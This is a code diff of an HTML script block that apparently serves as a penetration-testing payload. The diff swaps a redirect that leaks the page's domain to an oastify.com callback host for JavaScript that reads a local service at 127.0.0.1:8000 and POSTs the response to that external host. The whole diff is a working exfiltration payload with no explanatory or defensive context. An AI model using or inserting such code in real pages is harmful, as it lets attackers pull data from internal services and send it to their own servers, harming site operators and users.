@@ -1,6 +1,66 @@
 
         <script>
 
-    window.location.href='https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com?'+document.domain;
+// Function to make the XHR request
+function sendRequest() {
+    // Create a new XMLHttpRequest object
+    var xhr = new XMLHttpRequest();
+    
+    // Define the URL for the local server
+    var localUrl = 'http://127.0.0.1:8000';
+    
+    // Define the URL for the external server
+    var externalUrl = 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com';
+
+    // Configure it: GET-request for the URL
+    xhr.open('GET', localUrl, true);
+
+    // Define what happens on successful data submission
+    xhr.onload = function () {
+        if (xhr.status >= 200 && xhr.status < 400) {
+            // Success! Send the response to the external server
+            sendToExternalServer(xhr.responseText);
+        } else {
+            console.error('Error: Failed to retrieve data from the local server');
+        }
+    };
+
+    // Define what happens in case of error
+    xhr.onerror = function () {
+        console.error('Request failed');
+    };
+
+    // Send the request to the local server
+    xhr.send();
+}
+
+// Function to send the response data to the external server
+function sendToExternalServer(data) {
+    var xhr = new XMLHttpRequest();
+
+    // Configure it: POST-request for the URL
+    xhr.open('POST', 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+
+    // Define what happens on successful data submission
+    xhr.onload = function () {
+        if (xhr.status >= 200 && xhr.status < 400) {
+            console.log('Success: Data sent to the external server');
+        } else {
+            console.error('Error: Failed to send data to the external server');
+        }
+    };
+
+    // Define what happens in case of error
+    xhr.onerror = function () {
+        console.error('Request failed');
+    };
+
+    // Send the request with the data
+    xhr.send(JSON.stringify({ content: data }));
+}
+
+// Call the function to initiate the requests
+sendRequest();
     
 </script>
